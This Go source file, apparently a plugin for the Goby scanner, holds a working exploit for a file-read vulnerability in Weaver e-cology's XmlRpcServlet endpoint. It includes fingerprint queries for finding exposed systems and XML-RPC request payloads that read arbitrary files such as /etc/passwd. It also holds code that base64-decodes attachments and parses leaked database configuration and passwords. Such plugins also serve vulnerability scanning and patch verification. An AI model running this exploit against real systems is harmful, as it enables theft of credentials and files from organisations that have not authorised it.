package exploits

import (
	"encoding/base64"
	"encoding/xml"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver ecology XmlRpcServlet Path File Read Vulnerability",
    "Description": "<p>Weaver e-cology is an OA office system specifically designed for large and medium-sized enterprises, supporting simultaneous work on PC, mobile, and WeChat platforms.</p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Product": "Weaver-OA(E-COLOGY)",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-03-07",
    "Author": "715827922@qq.com",
    "FofaQuery": "((body=\"szFeatures\" && body=\"redirectUrl\") || (body=\"rndData\" && body=\"isdx\") || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\" || body=\"src=\\\"/js/jquery/jquery_wev8.js\" || (header=\"Server: WVS\" && (title!=\"404 Not Found\" && header!=\"404 Not Found\"))) && header!=\"testBanCookie\" && header!=\"Couchdb\" && header!=\"JoomlaWor\" && body!=\"<title>28ZE</title>\"",
    "GobyQuery": "((body=\"szFeatures\" && body=\"redirectUrl\") || (body=\"rndData\" && body=\"isdx\") || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\" || body=\"src=\\\"/js/jquery/jquery_wev8.js\" || (header=\"Server: WVS\" && (title!=\"404 Not Found\" && header!=\"404 Not Found\"))) && header!=\"testBanCookie\" && header!=\"Couchdb\" && header!=\"JoomlaWor\" && body!=\"<title>28ZE</title>\"",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://www.weaver.com.cn/cs/securityDownload.html\">https://www.weaver.com.cn/cs/securityDownload.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://www.weaver.com.cn/cs/securityDownload.html"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "methodName",
            "type": "select",
            "value": "WorkflowService.getAttachment,WorkflowService.LoadTemplateProp,",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Content-Type": "application/xml",
                    "Accept-Language": "zh-CN,zh;q=0.8",
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
                    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n<methodName>WorkflowService.LoadTemplateProp</methodName>\n<params>\n<param>\n<value><string>weaver</string></value>\n</param>\n</params>\n</methodCall>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<methodResponse>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "<params>",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ecology.password",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "ecology.url",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Content-Type": "application/xml",
                    "Accept-Language": "zh-CN,zh;q=0.8",
                    "Accept": "*/*",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
                    "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3"
                },
                "data_type": "text",
                "data": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n<methodName>WorkflowService.LoadTemplateProp</methodName>\n<params>\n<param>\n<value><string>{{{filePath}}}</string></value>\n</param>\n</params>\n</methodCall>"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "methodResponse",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\w\\W]+)"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.8",
    "Translation": {
        "CN": {
            "Name": "泛微 e-cology XmlRpcServlet 接口文件读取漏洞",
            "Product": "泛微-OA（e-cology）",
            "Description": "<p>泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。</p><p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞： <a href=\"https://www.weaver.com.cn/cs/securityDownload.html\">https://www.weaver.com.cn/cs/securityDownload.html</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Weaver ecology XmlRpcServlet Path File Read Vulnerability",
            "Product": "Weaver-OA(E-COLOGY)",
            "Description": "<p>Weaver e-cology is an OA office system specifically designed for large and medium-sized enterprises, supporting simultaneous work on PC, mobile, and WeChat platforms.<br></p><p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://www.weaver.com.cn/cs/securityDownload.html\">https://www.weaver.com.cn/cs/securityDownload.html</a><br></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-04",
    "PocId": "10834"
}`
	isSuccessParseXML455sdwca := func(xmlString string) (string, bool) {
		var keyAndValue string
		type Param struct {
			Name  string `xml:"name"`
			Value string `xml:"value"`
		}
		type MethodResponse struct {
			Params []Param `xml:"params>param>value>struct>member"`
		}
		var response MethodResponse
		decoder := xml.NewDecoder(strings.NewReader(xmlString))
		if err := decoder.Decode(&response); err != nil {
			return "", false
		}
		for _, member := range response.Params {
			keyAndValue = keyAndValue + "name: " + member.Name + "\t" + "value: " + member.Value + "\n"
		}
		return keyAndValue, true
	}

	isSuccessSendHttpRequest4518sdfsdf := func(hostInfo *httpclient.FixUrl, methodName string, filePath string) (*httpclient.HttpResponse, bool) {
		postBody := "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n<methodName>" + methodName + "</methodName>\n<params>\n<param>\n<value><string>" + filePath + "</string></value>\n</param>\n</params>\n</methodCall>"
		if methodName == "WorkflowService.LoadTemplateProp" {
			postBody = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<methodCall>\n<methodName>" + methodName + "</methodName>\n<params>\n<param>\n<value><string>weaver</string></value>\n</param>\n</params>\n</methodCall>"
		}
		requestConfig := httpclient.NewGetRequestConfig("/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet")
		if len(postBody) > 0 {
			requestConfig = httpclient.NewPostRequestConfig("/weaver/org.apache.xmlrpc.webserver.XmlRpcServlet")
			requestConfig.Data = postBody
		}
		requestConfig.Header.Store("Content-Type", "application/xml")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil {
			return resp, false
		}
		return resp, true
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, isSuccess := isSuccessSendHttpRequest4518sdfsdf(hostInfo, "WorkflowService.LoadTemplateProp", "weaver")
			return strings.Contains(resp.RawBody, "jdbc:") && isSuccess
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var decodedData []byte
			var outcome string
			var err error
			filePath := goutils.B2S(singleScanConfig.Params["filePath"])
			methodName := goutils.B2S(singleScanConfig.Params["methodName"])

			resp, isSuccess := isSuccessSendHttpRequest4518sdfsdf(expResult.HostInfo, methodName, filePath)
			if !isSuccess || resp.Status == "500 Internal Server Error" || strings.Contains(resp.RawBody, "系统程序出现异常") {
				expResult.Success = false
				expResult.Output = resp.RawBody
				if resp.Status == "500 Internal Server Error" || strings.Contains(resp.RawBody, "系统程序出现异常") {
					expResult.Output = "Error, perhaps the path/value does not exist or the target does not support this feature"
				}
				return expResult
			}
			if methodName == "WorkflowService.getAttachment" {
				re := regexp.MustCompile(`<base64>(.*?)</base64>`)
				match := re.FindStringSubmatch(resp.RawBody)
				if len(match) < 1 || match == nil {
					expResult.Success = false
					expResult.Output = "Error,successfully obtained data, but failed to decode to base64, possibly the data is not base64 encoded or the target does not support this feature"
					return expResult
				}
				base64Content := match[1]
				decodedData, err = base64.StdEncoding.DecodeString(base64Content)
				if err != nil {
					expResult.Success = false
					expResult.Output = "Error decoding base64: " + err.Error()
					return expResult
				}
				outcome = string(decodedData)
			} else if methodName == "WorkflowService.LoadTemplateProp" && strings.Contains(resp.RawBody, "jdbc:") {
				keyAndValue, isSuccessParse := isSuccessParseXML455sdwca(resp.RawBody)
				if !isSuccessParse {
					expResult.Success = false
					expResult.Output = "Error,The obtained result is not in XML format"
					return expResult
				}
				outcome = keyAndValue
			} else {
				expResult.Success = false
				expResult.Output = "Error,The feature does not exist in the target"
				return expResult
			}
			expResult.Success = true
			expResult.Output = outcome
			return expResult
		},
	))
}
